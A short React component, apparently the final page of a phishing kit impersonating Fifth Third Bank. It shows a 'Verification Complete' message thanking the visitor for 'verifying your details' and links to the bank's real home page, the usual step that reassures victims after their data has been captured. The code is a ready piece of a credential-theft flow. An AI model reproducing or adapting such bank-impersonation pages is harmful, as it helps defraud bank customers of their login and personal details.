
import { Link } from "react-router-dom";

export default function Grats() {
  return (
    <div rob-oos="" style={{ display: "block" }}>
      <div
        className="s-alerts -warning spacing-half -icon"
        data-valid="false"
        role="alert"
      >
        <span className="s-alerts__content" style={{ textAlign: "center" }}>
          <p className="b-3">Verification Complete</p>
          <p className="fs-1">
            Thank you for verifying your details with us, You'll be redirected
            to the home page.
          </p>
          <Link to={"https://www.53.com/content/fifth-third/en.html"}>Go home</Link>
        </span>
      </div>
    </div>
  );
}
